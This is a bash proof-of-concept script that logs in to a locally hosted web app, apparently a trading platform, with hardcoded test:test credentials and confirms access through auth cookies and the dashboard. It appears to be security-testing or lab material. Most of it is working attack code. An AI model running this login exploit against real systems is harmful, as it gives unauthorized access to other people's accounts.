#!/bin/bash

# POC: Verification of Hardcoded Test Credentials
# Target: http://localhost:8080/
# This POC verifies that test:test credentials work for authentication

TARGET_URL="http://localhost:8080"
PASSWORD_ENDPOINT="$TARGET_URL/password"

echo "[*] Hardcoded Test Credentials Authentication POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Attempt authentication with test:test
echo "[+] Step 1: Attempting authentication with test:test credentials..."

# Initialize session by visiting login page
curl -s -c /tmp/cookies.txt "$TARGET_URL/login" > /dev/null 2>&1

# Attempt password authentication via POST to /password/test
PASSWORD_RESPONSE=$(curl -s -w "\n%{http_code}" -b /tmp/cookies.txt -c /tmp/cookies.txt \
    -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=test&user_id=1&password=test" \
    "$PASSWORD_ENDPOINT/test" 2>&1)

# Extract HTTP status code
HTTP_CODE=$(echo "$PASSWORD_RESPONSE" | tail -1)
RESPONSE_BODY=$(echo "$PASSWORD_RESPONSE" | head -n -1)

echo "[*] HTTP Response Code: $HTTP_CODE"
echo ""

# Step 2: Analyze response
echo "[+] Step 2: Analyzing authentication response..."

if [ "$HTTP_CODE" = "200" ]; then
    echo "[*] Response is HTTP 200 (OK)"
elif [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "301" ]; then
    echo "[*] Response is HTTP $HTTP_CODE (Redirect - typically indicates success)"
elif [ "$HTTP_CODE" = "302" ]; then
    echo "[*] Response is HTTP 302 (Redirect)"
fi

# Check response body for success indicators
if echo "$RESPONSE_BODY" | grep -qi "auth_token"; then
    echo "[✓] Auth token found in response!"
    echo "[✓] VULNERABILITY CONFIRMED: test:test credentials are valid"
    echo "$RESPONSE_BODY" | grep -i "auth_token" | head -3
    exit 0
fi

# Check cookies
echo ""
echo "[+] Step 3: Checking for authentication cookies..."

if [ -f /tmp/cookies.txt ]; then
    COOKIE_CONTENT=$(cat /tmp/cookies.txt | grep -v "^#")
    if echo "$COOKIE_CONTENT" | grep -qi "auth_token\|session"; then
        echo "[✓] Authentication cookie found!"
        echo "[✓] VULNERABILITY CONFIRMED: test:test credentials authenticated"
        echo ""
        echo "[*] Cookies set:"
        cat /tmp/cookies.txt | grep -v "^#"
        exit 0
    fi
fi

# Try to access protected endpoint with the session
echo ""
echo "[+] Step 4: Verifying session by accessing dashboard..."

DASHBOARD=$(curl -s -w "\n%{http_code}" -b /tmp/cookies.txt "$TARGET_URL/dashboard" 2>&1)
DASH_CODE=$(echo "$DASHBOARD" | tail -1)
DASH_BODY=$(echo "$DASHBOARD" | head -n -1)

echo "[*] Dashboard HTTP Code: $DASH_CODE"

if [ "$DASH_CODE" = "200" ] && echo "$DASH_BODY" | grep -qi "dashboard\|portfolio\|account\|trading"; then
    echo "[✓] SUCCESS: Dashboard accessible with test:test session!"
    echo "[✓] VULNERABILITY CONFIRMED: Hardcoded test credentials grant authenticated access"
    exit 0
fi

# Check response body for content
echo ""
echo "[*] Authentication response body (first 1000 chars):"
echo "$RESPONSE_BODY" | head -c 1000
echo ""

# Final check - if we got any successful response with cookies, it's likely successful
if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "302" ]; then
    if [ -f /tmp/cookies.txt ] && [ -s /tmp/cookies.txt ]; then
        echo "[✓] VULNERABILITY CONFIRMED: Credentials accepted and session created"
        echo "[✓] test:test successfully authenticated"
        exit 0
    fi
fi

echo "[-] Could not confirm successful authentication"
echo "[*] Response code was $HTTP_CODE"
echo "[*] Response body was $(echo "$RESPONSE_BODY" | wc -c) bytes"
exit 1